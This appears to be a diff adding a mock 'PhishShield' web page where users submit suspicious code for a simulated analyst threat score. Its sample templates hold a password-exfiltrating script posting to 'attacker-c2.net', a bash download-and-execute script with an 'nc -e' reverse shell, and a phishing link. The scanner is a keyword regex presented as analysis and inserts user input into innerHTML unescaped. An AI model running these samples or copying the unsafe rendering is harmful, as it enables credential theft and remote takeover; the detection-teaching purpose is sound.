@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhishShield - Ask Security Analyst (Code Review)</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            transition: all 0.2s ease-in-out;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Navigation Bar */
+        header {
+            background-color: #1e293b;
+            border-bottom: 1px solid #334155;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-badge {
+            background-color: #0284c7;
+            color: #ffffff;
+            font-weight: 800;
+            font-size: 14px;
+            padding: 6px 10px;
+            border-radius: 6px;
+            letter-spacing: 0.5px;
+        }
+
+        .brand-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .brand-subtitle {
+            font-size: 12px;
+            color: #38bdf8;
+            font-weight: 500;
+        }
+
+        .status-pill {
+            background-color: rgba(16, 185, 129, 0.15);
+            color: #10b981;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            font-size: 12px;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 8px #10b981;
+        }
+
+        /* Main Workspace Grid */
+        main {
+            flex-grow: 1;
+            padding: 24px;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+
+        @media (max-width: 992px) {
+            main {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Card Container Styles */
+        .card {
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 0 0 16px 0;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #cbd5e1;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        select, input, textarea {
+            width: 100%;
+            background-color: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            color: #f8fafc;
+            padding: 10px 14px;
+            font-size: 13px;
+            outline: none;
+            font-family: inherit;
+        }
+
+        select:focus, input:focus, textarea:focus {
+            border-color: #38bdf8;
+            box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
+        }
+
+        .code-textarea {
+            font-family: 'Consolas', 'Courier New', monospace;
+            background-color: #090d16;
+            color: #38bdf8;
+            line-height: 1.5;
+            resize: vertical;
+            border: 1px solid #334155;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        button {
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background-color: #0284c7;
+            color: #ffffff;
+            flex-grow: 1;
+        }
+
+        .btn-primary:hover {
+            background-color: #0369a1;
+        }
+
+        .btn-secondary {
+            background-color: #334155;
+            color: #f8fafc;
+        }
+
+        .btn-secondary:hover {
+            background-color: #475569;
+        }
+
+        /* Preset Snippets Chips */
+        .preset-chips {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+
+        .chip {
+            background-color: #0f172a;
+            border: 1px solid #334155;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #94a3b8;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .chip:hover {
+            border-color: #38bdf8;
+            color: #38bdf8;
+            background-color: rgba(56, 189, 248, 0.05);
+        }
+
+        /* Analysis Display Panel */
+        .analysis-panel {
+            background-color: #0f172a;
+            border-radius: 8px;
+            border: 1px solid #334155;
+            padding: 20px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .risk-gauge-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #1e293b;
+            padding: 16px;
+            border-radius: 8px;
+            border-left: 4px solid #64748b;
+        }
+
+        .risk-high { border-left-color: #ef4444 !important; }
+        .risk-med { border-left-color: #f59e0b !important; }
+        .risk-low { border-left-color: #10b981 !important; }
+
+        .risk-score-value {
+            font-size: 24px;
+            font-weight: 800;
+        }
+
+        .history-list {
+            max-height: 260px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            padding-right: 4px;
+        }
+
+        .history-item {
+            background-color: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 12px;
+            cursor: pointer;
+        }
+
+        .history-item:hover {
+            border-color: #0284c7;
+        }
+
+        .history-item-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #94a3b8;
+            margin-bottom: 6px;
+        }
+
+        .badge {
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .badge-danger { background-color: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-warning { background-color: rgba(245, 158, 11, 0.2); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.3); }
+        .badge-success { background-color: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); }
+
+        /* Loader Animation */
+        .loader {
+            display: none;
+            border: 3px solid #334155;
+            border-top: 3px solid #38bdf8;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="brand">
+            <span class="brand-badge">SOC</span>
+            <div>
+                <div class="brand-title">PhishShield LMS</div>
+                <div class="brand-subtitle">Ask Security Analyst • Code & Payload Inspection</div>
+            </div>
+        </div>
+        <div class="status-pill">
+            <span class="status-dot"></span>
+            <span>Security Analyst Online</span>
+        </div>
+    </header>
+
+    <main>
+        <section class="card">
+            <h2 class="card-title">📝 1. Submit Suspicious Code / Snippet</h2>
+            
+            <div style="margin-bottom: 12px;">
+                <label>Quick Sample Templates:</label>
+                <div class="preset-chips">
+                    <span class="chip" onclick="loadTemplate('obfuscated')">⚠️ Obfuscated JS Payload</span>
+                    <span class="chip" onclick="loadTemplate('phishing_url')">🌐 Suspicious URL Redirect</span>
+                    <span class="chip" onclick="loadTemplate('shell_download')">🐚 Reverse Shell Script</span>
+                    <span class="chip" onclick="loadTemplate('safe_code')">✅ Normal Auth Code</span>
+                </div>
+            </div>
+
+            <form id="submission-form" onsubmit="submitDoubt(event)">
+                <div style="display: flex; gap: 12px; margin-bottom: 14px;">
+                    <div style="flex: 1;">
+                        <label for="syntax-type">Language / Syntax</label>
+                        <select id="syntax-type" onchange="updateEditorMode()">
+                            <option value="javascript">JavaScript / Node.js</option>
+                            <option value="python">Python Script</option>
+                            <option value="shell">Bash / Shell Script</option>
+                            <option value="html">HTML / Phishing URL</option>
+                            <option value="raw">Raw Text / Base64 Data</option>
+                        </select>
+                    </div>
+                    <div style="flex: 1;">
+                        <label for="severity-hint">User Severity Concern</label>
+                        <select id="severity-hint">
+                            <option value="unknown">Unsure / Need Clarification</option>
+                            <option value="high">Suspect Critical Threat / Malware</option>
+                            <option value="medium">Suspicious / Odd Behavior</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div style="margin-bottom: 14px;">
+                    <label for="code-input">Paste Code, Payload, or Target String</label>
+                    <textarea id="code-input" class="code-textarea" rows="8" placeholder="// Paste suspicious code snippet or script here..." required></textarea>
+                </div>
+
+                <div style="margin-bottom: 18px;">
+                    <label for="doubt-question">Your Question / Doubt for the Analyst</label>
+                    <input type="text" id="doubt-question" placeholder="e.g. Is this payload attempting credential harvesting or data exfiltration?" required>
+                </div>
+
+                <div class="btn-group">
+                    <button type="button" class="btn-secondary" onclick="clearForm()">Reset</button>
+                    <button type="submit" class="btn-primary" id="submit-btn">
+                        <span id="btn-text">Submit to Security Analyst</span>
+                        <div class="loader" id="btn-loader"></div>
+                    </button>
+                </div>
+            </form>
+        </section>
+
+        <section class="card">
+            <h2 class="card-title">🛡️ 2. Security Analyst Review & Threat Score</h2>
+            
+            <div id="analyst-output" class="analysis-panel">
+                <div style="text-align: center; color: #64748b; margin: auto 0; padding: 40px 0;">
+                    <div style="font-size: 32px; margin-bottom: 10px;">🔍</div>
+                    <p style="margin: 0; font-size: 14px;">Submit a code snippet or select a template to generate automated threat analysis and analyst feedback.</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="card" style="grid-column: 1 / -1;">
+            <h2 class="card-title">📜 3. Query History & Analyst Responses</h2>
+            <div class="history-list" id="history-container">
+                <!-- Dynamically populated history -->
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // Sample predefined templates for quick testing
+        const templates = {
+            obfuscated: {
+                lang: 'javascript',
+                question: 'I found this obfuscated script in a web page. Is it trying to steal passwords?',
+                code: `var _0x1a2b = ['/api/telemetry', 'cookie', 'fetch', 'POST', 'username=', 'password='];\n(function(_0x2d8f05, _0x4b81bb) {\n    var _0x4d7405 = function(_0x123a) {\n        while (--_0x123a) {\n            _0x2d8f05['push'](_0x2d8f05['shift']());\n        }\n    };\n    _0x4d7405(++_0x4b81bb);\n}(_0x1a2b, 0x1e4));\n\nfunction exfiltrate() {\n    let d = document.querySelector('input[type="password"]').value;\n    window['fetch']('https://attacker-c2.net/gate.php', { method: 'POST', body: d });\n}`
+            },
+            phishing_url: {
+                lang: 'html',
+                question: 'Is this URL posing as an authentic banking login portal?',
+                code: `<a href="http://login.secure-bank-update-passcode.com/auth?user=victim@corp.com">\n   Click here to verify your suspended bank account access.\n</a>\n<!-- Credential harvester masquerading as legitimate SSO login -->`
+            },
+            shell_download: {
+                lang: 'shell',
+                question: 'Our server logged this bash execution script. Is it a malicious reverse shell?',
+                code: `#!/bin/bash\n# Download external executable and execute silently\ncurl -s http://194.26.29.11/payload.bin -o /tmp/update.bin\nchmod +x /tmp/update.bin\n/tmp/update.bin &\nnc -e /bin/bash 194.26.29.11 4444`
+            },
+            safe_code: {
+                lang: 'python',
+                question: 'Is this python code performing safe token generation?',
+                code: `import secrets\nimport hmac\nimport hashlib\n\ndef generate_secure_token(user_id):\n    secret_key = b"safe_application_secret_key"\n    return hmac.new(secret_key, user_id.encode(), hashlib.sha256).hexdigest()`
+            }
+        };
+
+        // Query submission state storage
+        let historyData = [
+            {
+                id: '#4820',
+                time: '2 hours ago',
+                lang: 'Python',
+                question: 'Does this code leak environment variables?',
+                snippet: 'import os; print(os.environ.get("AWS_SECRET_ACCESS_KEY"))',
+                riskScore: 78,
+                status: 'High Threat',
+                badgeClass: 'badge-danger',
+                analystNotes: 'Exfiltrates cloud credentials. Remove hardcoded key outputs immediately.'
+            }
+        ];
+
+        function loadTemplate(key) {
+            const tpl = templates[key];
+            if (tpl) {
+                document.getElementById('syntax-type').value = tpl.lang;
+                document.getElementById('code-input').value = tpl.code;
+                document.getElementById('doubt-question').value = tpl.question;
+            }
+        }
+
+        function clearForm() {
+            document.getElementById('submission-form').reset();
+        }
+
+        function updateEditorMode() {
+            // Can be expanded to toggle syntax highlights
+        }
+
+        // Simulates Threat Analysis and Analyst Response Engine
+        function submitDoubt(e) {
+            e.preventDefault();
+
+            const code = document.getElementById('code-input').value;
+            const question = document.getElementById('doubt-question').value;
+            const lang = document.getElementById('syntax-type').value;
+
+            // Show UI Loader
+            document.getElementById('btn-text').innerText = 'Analyzing Payload...';
+            document.getElementById('btn-loader').style.display = 'inline-block';
+            document.getElementById('submit-btn').disabled = true;
+
+            setTimeout(() => {
+                // Restore button
+                document.getElementById('btn-text').innerText = 'Submit to Security Analyst';
+                document.getElementById('btn-loader').style.display = 'none';
+                document.getElementById('submit-btn').disabled = false;
+
+                // Simple threat engine heuristics evaluation
+                let riskScore = 15;
+                let threatLevel = 'Low / Benign';
+                let riskClass = 'risk-low';
+                let badgeClass = 'badge-success';
+                let indicators = [];
+
+                if (/fetch|curl|wget|nc -e|exec|eval|exfiltrate|attacker|passcode|password/i.test(code)) {
+                    riskScore += 45;
+                }
+                if (/base64|_0x|chmod \+x|tmp\/|http:\/\/|gate\.php/i.test(code)) {
+                    riskScore += 30;
+                }
+
+                if (riskScore >= 75) {
+                    threatLevel = 'Critical / Malicious';
+                    riskClass = 'risk-high';
+                    badgeClass = 'badge-danger';
+                    indicators.push('Credential Exfiltration Attempt', 'Suspicious External C2 Communication', 'Remote Execution Command');
+                } else if (riskScore >= 40) {
+                    threatLevel = 'Moderate / Suspicious';
+                    riskClass = 'risk-med';
+                    badgeClass = 'badge-warning';
+                    indicators.push('Unverified HTTP Target', 'Obfuscated Code Structure');
+                } else {
+                    indicators.push('Standard Security Controls Intact', 'No Malicious Payload Patterns Detected');
+                }
+
+                // Render Analyst Response Panel
+                const outputPanel = document.getElementById('analyst-output');
+                outputPanel.innerHTML = `
+                    <div class="risk-gauge-container ${riskClass}">
+                        <div>
+                            <div style="font-size: 11px; color: #94a3b8; text-transform: uppercase;">Threat Assessment</div>
+                            <div style="font-size: 16px; font-weight: 700; color: #ffffff;">${threatLevel}</div>
+                        </div>
+                        <div style="text-align: right;">
+                            <div style="font-size: 11px; color: #94a3b8;">Risk Score</div>
+                            <div class="risk-score-value">${riskScore} <span style="font-size: 14px; font-weight: normal; color: #94a3b8;">/ 100</span></div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div style="font-size: 12px; font-weight: 700; color: #38bdf8; margin-bottom: 4px;">👨‍💻 Analyst Technical Response:</div>
+                        <p style="font-size: 13px; color: #cbd5e1; line-height: 1.5; margin: 0; background-color: #1e293b; padding: 12px; border-radius: 6px; border: 1px solid #334155;">
+                            "Regarding your doubt: <em>'${question}'</em><br><br>
+                            Our automated SOC analysis confirmed that this snippet exhibits <strong>${threatLevel.toLowerCase()}</strong> traits. ${riskScore > 50 ? 'The snippet attempts unauthorized network connections or sensitive parameter parsing.' : 'The snippet appears safe for operational execution.'}"
+                        </p>
+                    </div>
+
+                    <div>
+                        <div style="font-size: 12px; font-weight: 700; color: #94a3b8; margin-bottom: 6px;">Key Threat Indicators Detected:</div>
+                        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                            ${indicators.map(ind => `<span style="background-color: #1e293b; border: 1px solid #334155; font-size: 11px; padding: 4px 10px; border-radius: 4px; color: #38bdf8;">• ${ind}</span>`).join('')}
+                        </div>
+                    </div>
+
+                    <div style="border-top: 1px solid #334155; padding-top: 12px;">
+                        <div style="font-size: 12px; font-weight: 700; color: #10b981;">Recommended Action:</div>
+                        <p style="font-size: 12px; color: #94a3b8; margin: 4px 0 0 0;">
+                            ${riskScore > 50 ? 'Quarantine this script immediately and revoke compromised credential tokens.' : 'Safe to proceed. Always verify API endpoint TLS certificate integrity.'}
+                        </p>
+                    </div>
+                `;
+
+                // Add to History
+                historyData.unshift({
+                    id: `#${Math.floor(1000 + Math.random() * 9000)}`,
+                    time: 'Just now',
+                    lang: lang.toUpperCase(),
+                    question: question,
+                    snippet: code.substring(0, 60) + '...',
+                    riskScore: riskScore,
+                    status: threatLevel,
+                    badgeClass: badgeClass,
+                    analystNotes: riskScore > 50 ? 'Quarantine recommended.' : 'Validated safe snippet.'
+                });
+
+                renderHistory();
+
+            }, 1000);
+        }
+
+        // Render History Items
+        function renderHistory() {
+            const container = document.getElementById('history-container');
+            container.innerHTML = historyData.map(item => `
+                <div class="history-item">
+                    <div class="history-item-header">
+                        <span><strong>${item.id}</strong> • ${item.lang} • ${item.time}</span>
+                        <span class="badge ${item.badgeClass}">${item.status} (${item.riskScore}/100)</span>
+                    </div>
+                    <div style="font-size: 13px; font-weight: 600; color: #f8fafc; margin-bottom: 4px;">Q: ${item.question}</div>
+                    <div style="font-size: 11px; font-family: monospace; color: #38bdf8; background-color: #090d16; padding: 6px 8px; border-radius: 4px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${item.snippet}</div>
+                </div>
+            `).join('');
+        }
+
+        // Initialize history display on startup
+        window.onload = function() {
+            renderHistory();
+        };
+    </script>
+</body>
+</html>
